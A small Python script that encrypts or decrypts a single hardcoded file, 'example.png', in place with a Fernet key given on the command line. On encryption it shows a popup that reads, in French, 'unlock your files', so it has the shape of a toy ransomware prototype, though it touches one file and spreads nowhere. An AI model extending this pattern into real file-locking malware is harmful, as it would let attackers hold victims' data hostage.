import tkinter
import tkinter.messagebox as tkMessageBox
from cryptography.fernet import Fernet
from sys import stdout, exit, argv
from time import time


#get command argument and put it in a var 
token = argv[1]
file_to_encrypt = "example.png"

#define an argument that can be be -encode or -decode
if argv[2] == "-encode":
    tkMessageBox.showinfo(title="Greetings", message="d√©bloquez vos fichiers.")

    #encode file with token
    f = Fernet(token)
    with open(file_to_encrypt, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_to_encrypt, "wb") as file:
        file.write(encrypted_data)
    print("File encrypted")
    exit(0)

elif argv[2] == "-decode":
    f = Fernet(token)
    with open(file_to_encrypt, "rb") as file:
        file_data = file.read()
    decrypted_data = f.decrypt(file_data)
    with open(file_to_encrypt, "wb") as file:
        file.write(decrypted_data)
    print("File decrypted")
    exit(0)